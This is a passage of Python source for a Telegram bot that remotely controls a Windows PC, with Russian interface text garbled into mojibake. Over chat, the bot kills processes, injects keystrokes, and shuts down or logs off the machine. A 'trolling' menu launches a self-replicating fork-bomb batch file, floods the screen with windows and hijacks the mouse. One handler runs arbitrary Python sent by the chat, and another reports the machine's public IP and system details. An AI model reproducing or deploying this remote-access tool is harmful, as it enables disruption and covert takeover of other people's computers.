            try: processes+=f'ID: {i}\n–ù–∞–∑–≤–∞–Ω–∏–µ: {psutil.Process(i).name()}\n–ü—É—Ç—å: P{psutil.Process(i).exe()}\n\n'    
            except: continue
                    
        if os.path.exists('C:\\temp\\') == False: make_temp_folder()

        bot.send_message(message.chat.id, f'‚òëÔ∏è C–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –±—ã–ª *—Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ —Ñ–∞–π–ª –Ω–∏–∂–µ*!\n\n–í–≤–µ–¥–∏—Ç–µ *ID –ø—Ä–æ—Ü–µ—Å—Å–∞* –¥–ª—è —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è –∏–ª–∏ *–Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É "–ù–∞–∑–∞–¥"*', parse_mode = "Markdown")
        with open("C:\\temp\\processes.txt", "w", encoding="utf-8") as file: file.write(processes)

        bot.send_document(message.chat.id, document = open('C:\\temp\\processes.txt', 'rb'), reply_markup=back_keyboard)
        os.remove('C:\\temp\\processes.txt')
        return bot.register_next_step_handler(message, check_process_list)

    def check_process_list(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip().isdigit() == False:
            bot.send_message(message.chat.id, '‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! ID –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º*', parse_mode='Markdown')
            return console_menu(message)
            
        kill_id = int(message.text.strip())
        parent = psutil.Process(kill_id)

        try:
            for child in parent.children(recursive=True): child.kill()
            parent.kill()
            
        except psutil.NoSuchProcess: bot.send_message(message.chat.id, '‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! –ü—Ä–æ—Ü–µ—Å—Å–∞ —Å —Ç–∞–∫–∏–º ID –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç*', parse_mode='Markdown')
        except psutil.AccessDenied: bot.send_message(message.chat.id, '‚ùå *–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! –î–ª—è —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è –¥–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤*', parse_mode='Markdown')
        finally: bot.send_message(message.chat.id, f'‚òëÔ∏è –ü—Ä–æ—Ü–µ—Å—Å —Å ID *{kill_id}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ —É–Ω–∏—á—Ç–æ–∂–µ–Ω!', parse_mode = "Markdown")
        return console_menu(message)


    def open_site(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)

        webopen(message.text.strip(), new=2)
        bot.send_message(message.chat.id, f'‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã–ª–∏ {message.text.strip()}*', parse_mode='Markdown')
        screen(message)
        return console_menu(message)


    def media_keys(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '‚å®Ô∏è *–í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –º–µ–Ω—é –º–µ–¥–∏–∞-–∫–ª–∞–≤–∏—à!*', reply_markup=media_keys_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, media_keys_check)

    def media_keys_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return keyboard_menu(message)
        elif message.text.strip() == media_keys_text_start_or_pause: keyboard.send('play/pause media')

        return media_keys(message)

    def keyboard_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '‚å®Ô∏è *–í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –º–µ–Ω—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã!*', reply_markup=menu_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, keyboard_check)

    def keyboard_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return start(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == keys_menu_write: return keyboard_write(message)
        elif message.text.strip() == keys_menu_press_keys: return keyboard_keys(message)
        elif message.text.strip() == keys_menu_media_keys: return media_keys(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return keyboard_menu(message)

    def keyboard_write(message: types.Message):
        if is_access_denied(message.from_user): return None

        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add(*KEYS, back_text, row_width=2)
        bot.send_message(message.chat.id, '‚å®Ô∏è *–í–ø–∏—à–∏—Ç–µ —Ç–æ, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç—å c –ø–æ–º–æ—â—å—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã, –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –≥–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏ –∏–∑ —Å–ø–∏—Å–∫–∞ –Ω–∏–∂–µ!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, keyboard_write_check)

    def keyboard_write_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return keyboard_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() in KEYS: keyboard.press(message.text.strip())
        else: keyboard.write(message.text.strip(), delay=0.2)

        return keyboard_write(message)

    def keyboard_keys(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add(*KEYS, back_text, row_width=2)
        bot.send_message(message.chat.id, '‚å®Ô∏è *–í–ø–∏—à–∏—Ç–µ –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –Ω–∏–∂–µ —Ç–æ, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—å!\n\n–ü—Ä–∏–º–µ—Ä—ã:\nalt - –Ω–∞–∂–º–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ alt\nalt+f4 - alt –∏ f4 –Ω–∞–∂–º—É—Ç—Å—è –≤–º–µ—Å—Ç–µ*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, keyboard_keys_check)

    def keyboard_keys_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return keyboard_menu(message)
        elif message.text.strip() == '/start': return start(message)

        try: keyboard.send(message.text.strip())
        except ValueError: bot.send_message(message.chat.id, '‚ùå *–û–¥–Ω–∞ –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–∑ –∫–ª–∞–≤–∏—à –Ω–µ –±—ã–ª–∞ –Ω–∞–π–¥–µ–Ω–∞!*', parse_mode='Markdown')
        
        return keyboard_keys(message)

    def other_functions(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, 'üîë *–í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é!*', reply_markup=specfunc_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_other)


    def check_other(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return start(message)
        elif message.text.strip() == specfunc_menu_delete_script_by_folders: return full_delete(message)
        elif message.text.strip() == specfunc_menu_logout_script: return script_exit(message)
        elif message.text.strip() == specfunc_menu_logout_your_account: return logout(message)
        elif message.text.strip() == specfunc_menu_restart_pc: return reboot(message)
        elif message.text.strip() == specfunc_menu_turn_off_pc: return off_computer(message)
            
        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return other_functions(message)

    def reboot(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, 'üò¢ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É –ü–ö!*', reply_markup=reboot_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, reboot_check)

    def reboot_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == if_confirm:
            bot.send_message(message.chat.id, '‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã–∑–≤–∞–ª–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É –ü–ö\n–û–Ω–∞ –ø—Ä–æ–∏–∑–æ–π–¥–µ—Ç –ø–æ—Å–ª–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é*', parse_mode='Markdown')
            mainmenu(message)
            bot.send_message(message.chat.id, "‚òëÔ∏è *–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞!*", parse_mode='Markdown')
            subprocess.run('shutdown -r -t 0')
            time.sleep(30)
            bot.send_message(message.chat.id, "‚ùå *–ü–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, –ø–æ–ª—É—á–µ–Ω–Ω–æ–π –Ω–∞—à–µ–π —Å–∏—Å—Ç–µ–º–æ–π, –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ, —á—Ç–æ –∫–æ–º–ø—å—é—Ç–µ—Ä –Ω–µ –±—ã–ª –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω. –í–æ–∑–º–æ–∂–Ω–æ, —ç—Ç–æ –ø—Ä–æ–∏–∑–æ—à–ª–æ –∏–∑-–∑–∞ —Ç–æ–≥–æ, —á—Ç–æ –æ–¥–∏–Ω –∏–∑ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –Ω–µ –±—ã–ª –∑–∞–≤–µ—Ä—à–µ–Ω, –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ–≥ –æ—Ç–º–µ–Ω–∏—Ç—å –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫.*", parse_mode='Markdown')
            return mainmenu(message)
        bot.send_message(message.chat.id, 'üéâ *–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É –ü–ö!*', parse_mode='Markdown')
        return other_functions(message)

    def off_computer(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, 'üò¢ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö!*', reply_markup=off_computer_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, off_computer_check)

    def off_computer_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == if_confirm:
            bot.send_message(message.chat.id, '‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã–∑–≤–∞–ª–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö\n–û–Ω–æ –ø—Ä–æ–∏–∑–æ–π–¥–µ—Ç –ø–æ—Å–ª–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é*', parse_mode='Markdown')
            mainmenu(message)
            subprocess.Popen('shutdown /s /t 0', shell=True)
            time.sleep(30)
            bot.send_message(message.chat.id, "‚ùå *–ü–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, –ø–æ–ª—É—á–µ–Ω–Ω–æ–π –Ω–∞—à–µ–π —Å–∏—Å—Ç–µ–º–æ–π, –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ, —á—Ç–æ –∫–æ–º–ø—å—é—Ç–µ—Ä –Ω–µ –±—ã–ª –≤—ã–∫–ª—é—á–µ–Ω. –í–æ–∑–º–æ–∂–Ω–æ, —ç—Ç–æ –ø—Ä–æ–∏–∑–æ—à–ª–æ –∏–∑-–∑–∞ —Ç–æ–≥–æ, —á—Ç–æ –æ–¥–∏–Ω –∏–∑ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –Ω–µ –±—ã–ª –∑–∞–≤–µ—Ä—à–µ–Ω, –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ–≥ –æ—Ç–º–µ–Ω–∏—Ç—å –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã.*", parse_mode='Markdown')
            return mainmenu(message)

        bot.send_message(message.chat.id, 'üéâ *–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö!*', parse_mode='Markdown')
        return other_functions(message)


    def logout(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, 'üò¢ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤—ã—Ö–æ–¥ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏!*', reply_markup=logout_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, logout_check)

    def logout_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == if_confirm:
            bot.send_message(message.chat.id, '‚òëÔ∏è *–í—ã —É—Å–ø–µ—à–Ω–æ –≤—ã—à–ª–∏ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏*', parse_mode='Markdown')
            return subprocess.run('shutdown /l')

        bot.send_message(message.chat.id, 'üéâ *–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –≤—ã—Ö–æ–¥ –∏–∑ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏!*', parse_mode='Markdown')
        return other_functions(message)


    def script_exit(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, 'üò¢ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞!*', reply_markup=script_exit_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_exit)

    def check_exit(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == if_confirm:
            bot.send_message(message.chat.id, 'üò• *–í—ã –∑–∞–≤–µ—Ä—à–∏–ª–∏ —Ä–∞–±–æ—Ç—É —Å–∫—Ä–∏–ø—Ç–∞!*', parse_mode='Markdown')
            return os.abort()

        bot.send_message(message.chat.id, 'üéâ *–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã —Å–∫—Ä–∏–ø—Ç–∞!*', parse_mode='Markdown')
        return other_functions(message)

    def packs(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, 'üë∫ *–í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –º–µ–Ω—é —Ç—Ä–æ–ª–ª–∏–Ω–≥–∞!*', reply_markup=packs_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_packs)

    def check_packs(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return start(message)
        elif message.text.strip() == packs_menu_open_cmds:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder()
            with open("C:\\temp\\troll.bat", "w") as file: file.write('start %0 %0')
            os.startfile("C:\\temp\\troll.bat")
            bot.send_message(message.chat.id, f'‚òëÔ∏è {packs_menu_open_cmds} —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!*', parse_mode='Markdown')
            return packs(message)

        elif message.text.strip() == packs_menu_open_sites:
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∞–π—Ç—ã —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é, –∫–æ—Ç–æ—Ä—ã–µ —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å! (–µ—Å–ª–∏ –≤—ã –≤–≤–µ–¥–µ—Ç–µ –∞–¥—Ä–µ—Å –±–µ–∑ —É–∫–∞–∑–∞–Ω–∏—è –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ https, —Ç–æ —Å–∞–π—Ç—ã –±—É–¥—É—Ç –æ—Ç–∫—Ä—ã–≤–∞—Ç—å—Å—è —Ç–æ–ª—å–∫–æ –≤ –±—Ä–∞—É–∑–µ—Ä–µ IE (Internet Explorer), —á—Ç–æ–±—ã –æ—Ç–∫—Ä—ã—Ç—å –≤ –¥—Ä—É–≥–æ–º –±—Ä–∞—É–∑–µ—Ä–µ, –¥–æ–±–∞–≤—å—Ç–µ –∫ —Å—Å—ã–ª–∫–µ –ø—Ä–æ—Ç–æ–∫–æ–ª HTTPS)*\n\n–ü—Ä–∏–º–µ—Ä—ã:\nhttps://resppl.ru - –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —Å–∞–π—Ç –±—É–¥–µ—Ç –æ—Ç–∫—Ä—ã—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ Yandex –∏–ª–∏ Google.\nresppl.ru - –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —Å–∞–π—Ç –±—É–¥–µ—Ç –æ—Ç–∫—Ä—ã—Ç —Ç–æ–ª—å–∫–æ –≤ –±—Ä–∞—É–∑–µ—Ä–µ Internet Explorer.', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, troll_website)
        elif message.text.strip() == packs_menu_open_conductors:
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ –≤—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å –ø—Ä–æ–≤–æ–¥–Ω–∏–∫!*', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, troll_provod)
        elif message.text.strip() == packs_menu_moving_mouse:
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥ –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–º–µ—â–∞—Ç—å –º—ã—à—å!*', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, mouse_troll)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return packs(message)

    def mouse_troll(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        xmouse = message.text.strip()
        if xmouse == "/start": return start(message)
        if xmouse == back_text: return packs(message)
        if xmouse.isdigit() == False:
            bot.send_message(message.chat.id, f'‚ùå *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!*', parse_mode='Markdown')
            return packs(message)

        bot.send_message(message.chat.id, f'‚òëÔ∏è *–û–±—Ä–∞—â–∞–µ–º –í–∞—à–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ —Ç–æ, —á—Ç–æ –Ω–∞—á–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã —Å–∫—Ä–∏–ø—Ç–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –±—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å–µ, —á—Ç–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Ä–∞–±–æ—Ç—ã —Å–∫—Ä–∏–ø—Ç–∞ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –í–∞–º –ø–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞.*', parse_mode='Markdown')
        
        for i in range(int(xmouse)): 
            for i in range(10): pyautogui.moveTo(randint(0, width), randint(0, height), duration=0.10)
        
        bot.send_message(message.chat.id, '‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º—ã—à–∫–∏ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*', parse_mode='Markdown')
        return packs(message)

    def troll_provod(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        xexplorer = message.text.strip()
        if xexplorer == "/start": return start(message)
        if xexplorer == back_text: return packs(message)
        if xexplorer.isdigit() == False:
            bot.send_message(message.chat.id, f'‚ùå *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!*', parse_mode='Markdown')
            return packs(message)

        bot.send_message(message.chat.id, f'‚òëÔ∏è *–û–±—Ä–∞—â–∞–µ–º –í–∞—à–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ —Ç–æ, —á—Ç–æ –Ω–∞—á–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã —Å–∫—Ä–∏–ø—Ç–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –±—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å–µ, —á—Ç–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Ä–∞–±–æ—Ç—ã —Å–∫—Ä–∏–ø—Ç–∞ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –í–∞–º –ø–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞.*', parse_mode='Markdown')

        for i in range(int(xexplorer)): keyboard.send("win+e")
        bot.send_message(message.chat.id, '‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*', parse_mode='Markdown')
        return packs(message)

    def troll_website(message: types.Message):
        if is_access_denied(message.from_user): return None

        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return packs(message)

        websites = message.text.strip().split(',')
        websites = [site.strip() for site in websites]

        bot.send_message(message.chat.id, f'‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ –≤—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å —É–∫–∞–∑–∞–Ω–Ω—ã–µ —Å–∞–π—Ç—ã!*', reply_markup=back_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, troll_open_websites, websites_list=websites)

    def troll_open_websites(message: types.Message, websites_list: List[str]):
        if is_access_denied(message.from_user): return None
        
        xsite = message.text.strip()
        if xsite == "/start": return start(message)
        elif message.text.strip() == back_text: return packs(message)
        if not xsite.isdigit():
            bot.send_message(message.chat.id, f'‚ùå *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!*', parse_mode='Markdown')
            return packs(message)

        bot.send_message(message.chat.id, f'‚òëÔ∏è *–û–±—Ä–∞—â–∞–µ–º –í–∞—à–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ —Ç–æ, —á—Ç–æ –Ω–∞—á–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã —Å–∫—Ä–∏–ø—Ç–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –±—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å–µ, —á—Ç–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Ä–∞–±–æ—Ç—ã —Å–∫—Ä–∏–ø—Ç–∞ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –í–∞–º –ø–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞.*', parse_mode='Markdown')

        for _ in range(int(xsite)):
            for site in websites_list:
                webopen(site, new=1)

        bot.send_message(message.chat.id, '‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–æ–≤ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*', parse_mode='Markdown')
        return packs(message)

    def full_delete(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, f"import shutil\n\nshutil.rmtree('{os.path.abspath(os.curdir)}')")
        return bot.register_next_step_handler(message, full_delete_open)

    def full_delete_open(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == "/start": return start(message)
        if os.path.exists('C:\\temp') == False: make_temp_folder()
        with open("C:\\temp\\DeleteFile.py", "w", encoding="utf-8") as file: file.write(message.text.strip())
        subprocess.Popen("python C:\\temp\\DeleteFile.py", shell=True)
        return other_functions(message)

    class Sound:
        """
        Class Sound
        :author: Paradoxis <luke@paradoxis.nl>
        :description:

        Allows you control the Windows volume
        The first time a sound method is called, the system volume is fully reset.
        This triggers sound and mute tracking.
        """

        # Current volume, we will set this to 100 once initialized
        __current_volume = None

        @staticmethod
        def current_volume():
            """
            Current volume getter
            :return: int
            """
            if Sound.__current_volume is None:
                return 0
            else:
                return Sound.__current_volume

        @staticmethod
        def __set_current_volume(volume):
            """
            Current volumne setter
            prevents numbers higher than 100 and numbers lower than 0
            :return: void
            """
            if volume > 100:
                Sound.__current_volume = 100
            elif volume < 0:
                Sound.__current_volume = 0
            else:
                Sound.__current_volume = volume


        # The sound is not muted by default, better tracking should be made
        __is_muted = False

        @staticmethod
        def is_muted():
            """
            Is muted getter
            :return: boolean
            """
            return Sound.__is_muted


        @staticmethod
        def __track():
            """
            Start tracking the sound and mute settings
            :return: void
            """
            if Sound.__current_volume == None:
                Sound.__current_volume = 0
                for i in range(0, 50):
                    Sound.volume_up()

        @staticmethod
        def volume_up():
            """
            Increase system volume
            Done by triggering a fake VK_VOLUME_UP key event
            :return: void
            """
            Sound.__track()
            Sound.__set_current_volume(Sound.current_volume() + 2)
            keyboard.send('volume up')

        @staticmethod
        def volume_down():
            """
            Decrease system volume
            Done by triggering a fake VK_VOLUME_DOWN key event
            :return: void
            """
            Sound.__track()
            Sound.__set_current_volume(Sound.current_volume() - 2)
            keyboard.send('volume down')

        @staticmethod
        def volume_set(amount):
            """
            Set the volume to a specific volume, limited to even numbers.
            This is due to the fact that a VK_VOLUME_UP/VK_VOLUME_DOWN event increases
            or decreases the volume by two every single time.
            :return: void
            """
            Sound.__track()

            if Sound.current_volume() > amount:
                for i in range(0, int((Sound.current_volume() - amount) / 2)):
                    Sound.volume_down()
            else:
                for i in range(0, int((amount - Sound.current_volume()) / 2)):
                    Sound.volume_up()


    def pc_settings(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, 'üîß *–í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –º–µ–Ω—é –Ω–∞—Å—Ç—Ä–æ–µ–∫ –ü–ö!*', reply_markup=pc_settings_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, pc_settings_check)

    def pc_settings_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return start(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == settings_pc_menu_change_brightness: return brightness_set(message)
        elif message.text.strip() == settings_pc_menu_change_volume: return volume_set(message)
        elif message.text.strip() == settings_pc_menu_info_pc:
            conn = HTTPConnection("ifconfig.me")
            try:
                conn.request("GET", "/ip")
                ip = conn.getresponse().read()
            except:
                ip = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"

            total_mem, used_mem, free_mem = disk_usage('.')
            gb = 10 ** 9
            login = os.getlogin()
            width, height = pyautogui.size()
            oper = uname()
                
            try: virtual_memory = psutil.virtual_memory()
            except: virtual_memory = '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
            try: battery = str(psutil.sensors_battery()[0]) + '%'
